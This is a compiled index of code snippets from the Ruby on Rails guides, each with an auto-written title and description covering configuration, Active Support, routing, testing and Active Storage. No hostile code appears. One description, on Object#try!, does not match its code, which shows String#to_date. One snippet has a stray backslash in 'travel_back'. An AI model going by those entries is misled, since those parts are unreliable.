https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_25\n\nLANGUAGE: yaml\nCODE:\n```\nproduction:\n  primary: &primary_production\n    <<: *default\n    database: app_production\n    username: app\n    password: <%= ENV[\"APP_DATABASE_PASSWORD\"] %>\n  cache:\n    <<: *primary_production\n    database: app_production_cache\n    migrations_paths: db/cache_migrate\n```\n\n----------------------------------------\n\nTITLE: Generating and Querying Date Ranges - Ruby\nDESCRIPTION: Adds methods like `all_week`, `all_month`, `all_quarter`, and `all_year` to the Date class for easily generating date ranges corresponding to logical time intervals. These methods facilitate range queries and iteration over meaningful calendar periods. ActiveSupport core extensions must be loaded. Outputs are Ruby Range objects spanning the time period.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_14\n\nLANGUAGE: Ruby\nCODE:\n```\n# Example: Date#all_week\nrange = Date.today.all_week # => (Mon..Sun) of the current week\n```\n\n----------------------------------------\n\nTITLE: Generating CDN Asset Paths with Rails Helper in ERB (ERB)\nDESCRIPTION: Uses the Rails 'asset_path' template helper to generate the URL for an asset (e.g., 'smile.png'), automatically including the configured CDN host if set. Requires Rails asset pipeline configuration and is intended for view templates. Input is the asset filename; output is the asset's full URL.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_17\n\nLANGUAGE: erb\nCODE:\n```\n<%= asset_path('smile.png') %>\n```\n\n----------------------------------------\n\nTITLE: Querying All Records\nDESCRIPTION: This command retrieves all records from the `products` table in the database and returns them as an `ActiveRecord::Relation` object, which is an array-like collection of Product instances. It uses the `all` method, a class method called on the Product model itself.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_16\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> Product.all\n```\n\n----------------------------------------\n\nTITLE: Removing Uniqueness Constraint in Rails\nDESCRIPTION: Illustrates how to remove the uniqueness constraint applied by `distinct`, effectively selecting all values including duplicates. It uses `distinct(false)` to achieve this.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_88\n\nLANGUAGE: ruby\nCODE:\n```\n# Returns unique last_names\nquery = Customer.select(:last_name).distinct\n\n# Returns all last_names, even if there are duplicates\nquery.distinct(false)\n```\n\n----------------------------------------\n\nTITLE: Configuring Eager Loading in Rails Environment\nDESCRIPTION: Simple configuration to enable eager loading in development and test environments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.eager_load = true\n```\n\n----------------------------------------\n\nTITLE: Adding Field-specific Errors in Rails Validators\nDESCRIPTION: This snippet demonstrates how to add an error for a specific field in a validator class by passing the field name as the first argument to the add method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_40\n\nLANGUAGE: ruby\nCODE:\n```\ndef validate(record)\n  if record.some_field != \"acceptable\"\n    record.errors.add :some_field, \"this field is unacceptable\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configure PostgreSQL Unlogged Tables in Test Environment - Ruby\nDESCRIPTION: This snippet demonstrates how to configure the PostgreSQL adapter to create unlogged tables in the test environment. Unlogged tables can improve performance but risk data loss in case of database crashes. It is highly recommended not to enable this in production environments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_43\n\nLANGUAGE: ruby\nCODE:\n```\n# config/environments/test.rb\n\nActiveSupport.on_load(:active_record_postgresqladapter) do\n  self.create_unlogged_tables = true\nend\n```\n\n----------------------------------------\n\nTITLE: Enabling/Disabling Action Mailer Previews in Ruby\nDESCRIPTION: This code snippet shows how to disable mailer previews by setting `config.action_mailer.show_previews` to `false`. By default, mailer previews are enabled in the development environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_64\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_mailer.show_previews = false\n```\n\n----------------------------------------\n\nTITLE: Simple System Test Assertion (Ruby)\nDESCRIPTION: This Ruby code shows a simple system test that visits the articles index page and asserts that an `h1` element with the text \"Articles\" is present.  It uses `visit` to navigate and `assert_selector` to check the content.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_68\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"application_system_test_case\"\n\nclass ArticlesTest < ApplicationSystemTestCase\n  test \"viewing the index\" do\n    visit articles_path\n    assert_selector \"h1\", text: \"Articles\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Installing Bundled Dependencies - Bundler - Bash\nDESCRIPTION: Runs Bundler to install all gem dependencies listed in your plugin's Gemfile. Ensures that you have all the libraries required for development, testing, and functionality before proceeding with further development. Only requires a Bash terminal and a valid Gemfile.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle install\n```\n\n----------------------------------------\n\nTITLE: Individual Record Processing with find_each in Ruby on Rails\nDESCRIPTION: Shows how to process individual records using find_each, which internally uses find_in_batches for efficient batch processing while presenting a simpler interface.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.find_each do |customer|\n  customer.update_account_balance!\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Trilogy Adapter with DATABASE_URL\nDESCRIPTION: Example of configuring the Trilogy database adapter using the DATABASE_URL environment variable as an alternative to the database.yml file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nENV[\"DATABASE_URL\"] # => \"trilogy://localhost/blog_development?pool=5\"\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies on Debian\nDESCRIPTION: Commands to install all required dependencies on Debian systems, with a note about MariaDB being the default MySQL server.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/development_dependencies_install.md#2025-04-23_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo apt-get install sqlite3 libsqlite3-dev default-mysql-server default-libmysqlclient-dev postgresql postgresql-client postgresql-contrib libpq-dev redis-server memcached imagemagick ffmpeg mupdf mupdf-tools libxml2-dev libvips42 poppler-utils\n```\n\n----------------------------------------\n\nTITLE: Generating Image Tag with Multiple HTML Options in Rails\nDESCRIPTION: This code snippet demonstrates how to use the `image_tag` helper with multiple HTML options in Rails to generate an HTML `<img>` tag. It sets the `alt`, `id`, and `class` attributes of the `<img>` tag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_58\n\nLANGUAGE: erb\nCODE:\n```\n<%= image_tag \"home.gif\", alt: \"Go Home\",\n                          id: \"HomeImage\",\n                          class: \"nav_bar\" %>\n```\n\n----------------------------------------\n\nTITLE: Extending Array with to_param for URL Parameterization - Ruby\nDESCRIPTION: Demonstrates extending the Array class with a to_param method, which recursively calls to_param on its elements and joins them with slashes. This supports parameter serialization required by url_for in Action Pack. Calls to Array#to_param depend on each element implementing a to_param method, and the method outputs a string ready for URL use. No external dependencies are needed beyond Ruby and Rails conventions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\nclass Array\n  # Calls +to_param+ on all its elements and joins the result with\n  # slashes. This is used by +url_for+ in Action Pack.\n  def to_param\n    collect { |e| e.to_param }.join \"/\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using to_model in Active Model (Ruby)\nDESCRIPTION: This snippet demonstrates the use of the `to_model` method in Active Model. If your model doesn't behave like an Active Model object, you should define `:to_model` yourself, returning a proxy object with Active Model compliant methods.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person\n  def to_model\n    # A proxy object that wraps your object with Active Model compliant methods.\n    PersonModel.new(self)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Setting New Framework Default Value in Ruby\nDESCRIPTION: Demonstrates modifying the `Rails::Application::Configuration#load_defaults` method to set the new default value for a framework configuration option (`active_job.existing_behavior = false`) when an application targets a specific Rails version (7.1). This ensures that new or upgraded applications targeting this version adopt the new behavior by default.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_36\n\nLANGUAGE: ruby\nCODE:\n```\ndef load_defaults(target_version)\n  case target_version.to_s\n  when \"7.1\"\n    # ...\n    if respond_to?(:active_job)\n      active_job.existing_behavior = false\n    end\n    # ...\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Rendering Template with Explicit Option\nDESCRIPTION: Same as the previous example, but uses the `:template` option to explicitly specify the template to render.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nrender template: \"products/show\"\n```\n\n----------------------------------------\n\nTITLE: Resourceful Route with Path Names Override in Rails\nDESCRIPTION: This snippet demonstrates how to override the default `new` and `edit` segments in paths using the `:path_names` option.  It changes `/photos/new` to `/photos/make` and `/photos/:id/edit` to `/photos/:id/change`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_67\n\nLANGUAGE: ruby\nCODE:\n```\nresources :photos, path_names: { new: \"make\", edit: \"change\" }\n```\n\n----------------------------------------\n\nTITLE: Creating a New Rails Application (Bash)\nDESCRIPTION: Generates a new standard Rails application named 'unicorn' using the `rails new` command. This application will serve as the host for the 'blorgh' engine.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_26\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new unicorn\n```\n\n----------------------------------------\n\nTITLE: Titleizing Strings\nDESCRIPTION: Illustrates the `titleize` method, which capitalizes each word in a string. This method is useful for creating human-readable titles.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_73\n\nLANGUAGE: ruby\nCODE:\n```\n\"alice in wonderland\".titleize # => \"Alice In Wonderland\"\n\"fermat's enigma\".titleize     # => \"Fermat's Enigma\"\n```\n\n----------------------------------------\n\nTITLE: Capitalizing the First Letter of a String in Ruby\nDESCRIPTION: This code snippet shows how to capitalize the first letter of a string using the `upcase_first` method. This is an ActiveSupport core extension to the String class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_90\n\nLANGUAGE: ruby\nCODE:\n```\n\"employee salary\".upcase_first # => \"Employee salary\"\n\"\".upcase_first                # => \"\"\n```\n\n----------------------------------------\n\nTITLE: Range Include?/=== Ruby\nDESCRIPTION: The `include?` and `===` methods determine if a value falls within a range. Active Support extends this to support range arguments, checking if the ends of the argument range are within the receiver range.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_139\n\nLANGUAGE: ruby\nCODE:\n```\n(2..3).include?(Math::E) # => true\n```\n\nLANGUAGE: ruby\nCODE:\n```\n(1..10) === (3..7)  # => true\n(1..10) === (0..7)  # => false\n(1..10) === (3..11) # => false\n(1...9) === (3..9)  # => false\n\n(1..10).include?(3..7)  # => true\n(1..10).include?(0..7)  # => false\n(1..10).include?(3..11) # => false\n(1...9).include?(3..9)  # => false\n```\n\n----------------------------------------\n\nTITLE: Example Cache Generation Payload in ActiveSupport\nDESCRIPTION: Example of a payload structure for cache_generate.active_support event when using fetch with a block. This payload contains the key being accessed and the cache store class name.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  key: \"name-of-complicated-computation\",\n  store: \"ActiveSupport::Cache::MemCacheStore\"\n}\n```\n\n----------------------------------------\n\nTITLE: Enabling Zeitwerk Autoloading Mode in Rails 6\nDESCRIPTION: This Ruby code demonstrates how to enable Zeitwerk autoloading mode in Rails 6, either by setting the default configuration or explicitly setting the autoloader.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\n\nconfig.load_defaults 6.0\n\n# Or explicitly:\n\nconfig.autoloader = :zeitwerk\n```\n\n----------------------------------------\n\nTITLE: Testing Channel.broadcast_to with Channel.broadcasting_for\nDESCRIPTION: This code demonstrates how to test broadcasts made with `Channel.broadcast_to` using `Channel.broadcasting_for` to generate the underlying stream name. It showcases testing a `ChatRelayJob` that broadcasts a message to a room and asserting the broadcast on the correct stream.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_110\n\nLANGUAGE: ruby\nCODE:\n```\n# app/jobs/chat_relay_job.rb\nclass ChatRelayJob < ApplicationJob\n  def perform(room, message)\n    ChatChannel.broadcast_to room, text: message\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# test/jobs/chat_relay_job_test.rb\nrequire \"test_helper\"\n\nclass ChatRelayJobTest < ActiveJob::TestCase\n  include ActionCable::TestHelper\n\n  test \"broadcast message to room\" do\n    room = rooms(:all)\n\n    assert_broadcast_on(ChatChannel.broadcasting_for(room), text: \"Hi!\") do\n      ChatRelayJob.perform_now(room, \"Hi!\")\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Models Using Rails CLI - Rails Model Generator - Bash\nDESCRIPTION: These commands generate two Active Record models (Hickwall and Wickwall) in the dummy test application, specifying fields related to the yaffle plugin functionality. The generated models are used to validate ActsAsYaffle behavior through tests. Requires Rails and a valid dummy app context.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\n$ cd test/dummy\n$ bin/rails generate model Hickwall last_squawk:string\n$ bin/rails generate model Wickwall last_squawk:string last_tweet:string\n```\n\n----------------------------------------\n\nTITLE: Creating New Product Action (Ruby)\nDESCRIPTION: This Ruby code defines the `new` action in the `ProductsController`. It instantiates a new `Product` object and assigns it to the `@product` instance variable for use in the new product form.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_52\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProductsController < ApplicationController\n  def index\n    @products = Product.all\n  end\n\n  def show\n    @product = Product.find(params[:id])\n  end\n\n  def new\n    @product = Product.new\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Registering Custom RSS Parser in ActionView::TestCase\nDESCRIPTION: Shows how to register a custom RSS parser using ActionView::TestCase.register_parser to test RSS output from view templates.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\nregister_parser :rss, -> rendered { RSS::Parser.parse(rendered) }\n\ntest \"renders RSS\" do\n  article = Article.create!(title: \"Hello, world\")\n\n  render formats: :rss, partial: article, locals: { article: article }\n\n  assert_equal \"Hello, world\", rendered_rss.items.last.title\nend\n```\n\n----------------------------------------\n\nTITLE: Checking Attachment Presence on Active Storage Association (Ruby)\nDESCRIPTION: Checks if a user has an attached avatar via the attached? Active Storage API. Returns true or false. No special dependencies outside Active Storage.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\nuser.avatar.attached?\n```\n\n----------------------------------------\n\nTITLE: Truncating Strings with truncate\nDESCRIPTION: This Ruby code demonstrates the `truncate` method, which returns a truncated copy of a string after a given length. It adds an ellipsis (...) to indicate that the string has been truncated.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_41\n\nLANGUAGE: ruby\nCODE:\n```\n\"Oh dear! Oh dear! I shall be late!\".truncate(20)\n# => \"Oh dear! Oh dear!...\"\n```\n\n----------------------------------------\n\nTITLE: Equality Condition with Boolean in Rails\nDESCRIPTION: This snippet demonstrates how to use the `where` method in Active Record to find books where the `out_of_print` attribute is true. It directly maps a boolean value to the corresponding database representation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_58\n\nLANGUAGE: ruby\nCODE:\n```\nBook.where(out_of_print: true)\n```\n\n----------------------------------------\n\nTITLE: Enabling Preprocessing for Variants on Attachment (Ruby)\nDESCRIPTION: Illustrates how to instruct Rails to generate a variant (e.g., thumb) in the background after attachment by using preprocessed: true. Useful for eager variant generation to avoid on-demand latency. Requires Active Job and necessary variants/processing backend.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  has_one_attached :video do |attachable|\n    attachable.variant :thumb, resize_to_limit: [100, 100], preprocessed: true\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Managing Application Deprecators - Ruby on Rails - Ruby\nDESCRIPTION: Shows how to add custom deprecators to the application-level deprecators collection, configure settings globally, and silence all warnings within a block. This centralizes deprecation handling for multiple components or gems and ensures uniform behavior (e.g., debug mode, silenced block) for deprecation warnings.\n\n- Dependencies: Rails >= 7.1\n- Parameters: identifier symbol for deprecator, version string, library name\n- Input: blocks of code to silence; :debug configuration\n- Output: Modified deprecator behavior and warnings.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.deprecators[:my_gem] = ActiveSupport::Deprecation.new(\"2.0\", \"MyGem\")\nRails.application.deprecators[:other_gem] = ActiveSupport::Deprecation.new(\"3.0\", \"OtherGem\")\n```\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.deprecators.debug = true\n\nRails.application.deprecators[:my_gem].debug\n# => true\n\nRails.application.deprecators[:other_gem].debug\n# => true\n```\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.deprecators.silence do\n  Rails.application.deprecators[:my_gem].warn    # No warning (silenced)\n  Rails.application.deprecators[:other_gem].warn # No warning (silenced)\nend\n```\n\n----------------------------------------\n\nTITLE: Displaying Example Middleware Stack Output - Ruby\nDESCRIPTION: This snippet is a representative Ruby middleware stack output as shown when running the middleware inspection command. It lists 'use ...' statements that define the middleware layers and the final 'run' statement specifies the application endpoint. Useful for understanding default middleware order and structure. No dependencies; this is for documentation and reference purposes only.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_on_rack.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nuse ActionDispatch::HostAuthorization\\nuse Rack::Sendfile\\nuse ActionDispatch::Static\\nuse ActionDispatch::Executor\\nuse ActionDispatch::ServerTiming\\nuse ActiveSupport::Cache::Strategy::LocalCache::Middleware\\nuse Rack::Runtime\\nuse Rack::MethodOverride\\nuse ActionDispatch::RequestId\\nuse ActionDispatch::RemoteIp\\nuse Sprockets::Rails::QuietAssets\\nuse Rails::Rack::Logger\\nuse ActionDispatch::ShowExceptions\\nuse WebConsole::Middleware\\nuse ActionDispatch::DebugExceptions\\nuse ActionDispatch::ActionableExceptions\\nuse ActionDispatch::Reloader\\nuse ActionDispatch::Callbacks\\nuse ActiveRecord::Migration::CheckPending\\nuse ActionDispatch::Cookies\\nuse ActionDispatch::Session::CookieStore\\nuse ActionDispatch::Flash\\nuse ActionDispatch::ContentSecurityPolicy::Middleware\\nuse Rack::Head\\nuse Rack::ConditionalGet\\nuse Rack::ETag\\nuse Rack::TempfileReaper\\nrun MyApp::Application.routes\n```\n\n----------------------------------------\n\nTITLE: Defining Resourceful Routes and Namespacing with Rails 3 Router - Ruby\nDESCRIPTION: Demonstrates the changes to the Rails router DSL in Rails 3, showing how resourceful routes are now defined within the application namespace instead of the global scope with ActionController::Routing::Routes. Highlights migration from the old syntax to the new one. There are no external dependencies besides Rails itself; 'AppName' represents the Rails application module. Inputs are resource symbols, output is updated routing table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_0_release_notes.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\n# Instead of:\n\nActionController::Routing::Routes.draw do |map|\n  map.resources :posts\nend\n\n# You do:\n\nAppName::Application.routes do\n  resources :posts\nend\n```\n\n----------------------------------------\n\nTITLE: Generating CDN Asset Path with Custom Host (ERB)\nDESCRIPTION: Demonstrates use of the 'asset_path' view helper in Rails with a custom ':host' option, overriding the global asset_host for this asset only. This is used in ERB templates to deliver a specific asset from a given CDN or host. Inputs are the filename and host; output is the complete asset URL using the provided host.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_18\n\nLANGUAGE: erb\nCODE:\n```\n<%= asset_path 'image.png', host: 'mycdnsubdomain.fictional-cdn.com' %>\n```\n\n----------------------------------------\n\nTITLE: Resourceful Route with ID Constraints Block in Rails\nDESCRIPTION: Demonstrates applying constraints within a block to several routes. This constraints the `id` parameter for both `photos` and `accounts` resources.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_65\n\nLANGUAGE: ruby\nCODE:\n```\nconstraints(id: /[A-Z][A-Z][0-9]+/) do\n  resources :photos\n  resources :accounts\nend\n```\n\n----------------------------------------\n\nTITLE: Using Disabled Options in select Helpers - Rails (Ruby)\nDESCRIPTION: Demonstrates how to disable specific options when generating a select field in Rails by passing :disabled with a value to the select helper. Helps prevent user selection of certain choices. Input is a collection and disabled option; output is a select field with a disabled tag. Requires Rails 2.3+.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\nselect(:post, :category, Post::CATEGORIES, :disabled => 'private')\n```\n\n----------------------------------------\n\nTITLE: HTML Output of Manual Select\nDESCRIPTION: This snippet shows the HTML output from the manual select creation, containing options for Berlin, Chicago, and Madrid.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_51\n\nLANGUAGE: html\nCODE:\n```\n<select name=\"person[city_id]\" id=\"person_city_id\">\n  <option value=\"1\">Berlin</option>\n  <option value=\"3\">Chicago</option>\n  <option value=\"2\">Madrid</option>\n</select>\n```\n\n----------------------------------------\n\nTITLE: Explicit Template Dependency Declaration\nDESCRIPTION: This example shows how to explicitly declare a template dependency in a Rails view using a special comment format. This is necessary when rendering happens within helper methods.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_18\n\nLANGUAGE: html\nCODE:\n```\n<%# Template Dependency: todolists/todolist %>\n<%= render_sortable_todolists @project.todolists %>\n```\n\n----------------------------------------\n\nTITLE: Deleting middleware from Rails stack\nDESCRIPTION: Demonstrates deleting a middleware (`Rack::MethodOverride`) from the Rails middleware stack using `config.middleware.delete`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.middleware.delete Rack::MethodOverride\n```\n\n----------------------------------------\n\nTITLE: Manipulating Time During Tests with TimeHelpers - Ruby\nDESCRIPTION: These methods, `travel`, `travel_to`, and `travel_back`, provided by ActiveSupport::Testing::TimeHelpers, enable stubbing of current time for the duration of tests. They override behaviors of Time.now and Date.today, making it easier to test time-dependent logic. Use `.travel` or `.travel_to` to set simulated time, and `.travel_back` to revert to real time. Requires ActiveSupport::Testing::TimeHelpers during testing.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_12\n\nLANGUAGE: Ruby\nCODE:\n```\ninclude ActiveSupport::Testing::TimeHelpers\n\n# Travel to a specific time\ndesired_time = Time.new(2020, 1, 1, 8, 0, 0)\ntravel_to(desired_time) do\n  # Time.now and Date.today are mocked within this block\nend\n\n# Travel forward by 1 day\ntravel 1.day do\n  # Time.now is 1 day ahead\nend\n\n# Revert to actual time\travel_back\n```\n\n----------------------------------------\n\nTITLE: Evaluating Code in Singleton Class Context with `class_eval`\nDESCRIPTION: This snippet demonstrates how to use `class_eval` to evaluate code in the context of an object's singleton class. This allows you to dynamically add or modify methods on specific objects.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nclass Proc\n  def bind(object)\n    block, time = self, Time.current\n    object.class_eval do\n      method_name = \"__bind_#{time.to_i}_#{time.usec}\"\n      define_method(method_name, &block)\n      method = instance_method(method_name)\n      remove_method(method_name)\n      method\n    end.bind(object)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using try! Method in Ruby for NoMethodError Behavior\nDESCRIPTION: Example showing the new Object#try! method that maintains the old behavior of raising NoMethodError when the receiving object doesn't implement the method, contrasting with Object#try which now returns nil in those cases.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_0_release_notes.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\n# ActiveSupport 3.x\n\"asdf\".to_date # => NoMethodError: undefined method `div' for nil:NilClass\n\"333\".to_date # => NoMethodError: undefined method `div' for nil:NilClass\n\n# ActiveSupport 4\n\"asdf\".to_date # => ArgumentError: invalid date\n\"333\".to_date # => Fri, 29 Nov 2013\n```\n\n----------------------------------------\n\nTITLE: Generating Time Ranges with all_day, all_week, all_month, all_quarter, all_year in Rails\nDESCRIPTION: These methods, available in Rails' Active Support, generate ranges representing the entire day, week, month, quarter, or year of a given Time object. They provide a convenient way to define time boundaries for queries or calculations. The `all_week` method can also accept a symbol representing the beginning of the week, like `:sunday`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_167\n\nLANGUAGE: ruby\nCODE:\n```\nnow = Time.current\n# => Mon, 09 Aug 2010 23:20:05 UTC +00:00\nnow.all_day\n# => Mon, 09 Aug 2010 00:00:00 UTC +00:00..Mon, 09 Aug 2010 23:59:59 UTC +00:00\n```\n\nLANGUAGE: ruby\nCODE:\n```\nnow = Time.current\n# => Mon, 09 Aug 2010 23:20:05 UTC +00:00\nnow.all_week\n# => Mon, 09 Aug 2010 00:00:00 UTC +00:00..Sun, 15 Aug 2010 23:59:59 UTC +00:00\nnow.all_week(:sunday)\n# => Sun, 16 Sep 2012 00:00:00 UTC +00:00..Sat, 22 Sep 2012 23:59:59 UTC +00:00\nnow.all_month\n# => Sat, 01 Aug 2010 00:00:00 UTC +00:00..Tue, 31 Aug 2010 23:59:59 UTC +00:00\nnow.all_quarter\n# => Thu, 01 Jul 2010 00:00:00 UTC +00:00..Thu, 30 Sep 2010 23:59:59 UTC +00:00\nnow.all_year\n# => Fri, 01 Jan 2010 00:00:00 UTC +00:00..Fri, 31 Dec 2010 23:59:59 UTC +00:00\n```\n\n----------------------------------------\n\nTITLE: HTML Output with content_for and Yield\nDESCRIPTION: This code snippet shows the resulting HTML when a view using `content_for` is rendered within a layout containing a named `yield`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_68\n\nLANGUAGE: html\nCODE:\n```\n<html>\n  <head>\n    <title>A simple page</title>\n  </head>\n  <body>\n    <p>Hello, Rails!</p>\n  </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Running Database Migrations\nDESCRIPTION: This bash command executes the migrations that add the action_text_* and active_storage_* tables to the application's database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:migrate\n```\n\n----------------------------------------\n\nTITLE: Configuring MessageEncryptor/MessageVerifier with MessagePack - Ruby on Rails - Ruby\nDESCRIPTION: Shows how to initialize ActiveSupport::MessageEncryptor and ActiveSupport::MessageVerifier to use MessagePack as the serializer. Requires Rails and the 'msgpack' gem to be available. The code demonstrates secure message encryption/verification with a custom serialization strategy.\n\n- Dependencies: Rails (ActiveSupport), msgpack gem\n- Parameters: 'secret' (used for encryption/key)\n- Input: any object to be serialized/encrypted\n- Output: encrypted/verified objects using MessagePack serialization.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport::MessageEncryptor.new(secret, serializer: :message_pack)\n```\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport::MessageVerifier.new(secret, serializer: :message_pack)\n```\n\n----------------------------------------\n\nTITLE: Rails Application Setup Commands\nDESCRIPTION: Bash commands for setting up and running a Rails application with Propshaft.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new app_name\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails server\n```\n\n----------------------------------------\n\nTITLE: Sample YAML Fixture - YAML\nDESCRIPTION: This code shows a sample YAML fixture file with two records (david and steve), each containing name, birthday, and profession fields. It demonstrates the basic structure of a YAML fixture file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_23\n\nLANGUAGE: yaml\nCODE:\n```\n# lo & behold! I am a YAML comment!\ndavid:\n  name: David Heinemeier Hansson\n  birthday: 1979-10-15\n  profession: Systems development\n\nsteve:\n  name: Steve Ross Kellock\n  birthday: 1974-09-27\n  profession: guy with keyboard\n```\n\n----------------------------------------\n\nTITLE: Accessing Reserved Keyword Locals\nDESCRIPTION: Explains how to access local variables with names that are reserved Ruby keywords (like `class`) through `binding.local_variable_get`. This is necessary to avoid syntax errors.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_40\n\nLANGUAGE: erb\nCODE:\n```\n<%# locals: (class: \"message\") %>\n<div class=\"<%= binding.local_variable_get(:class) 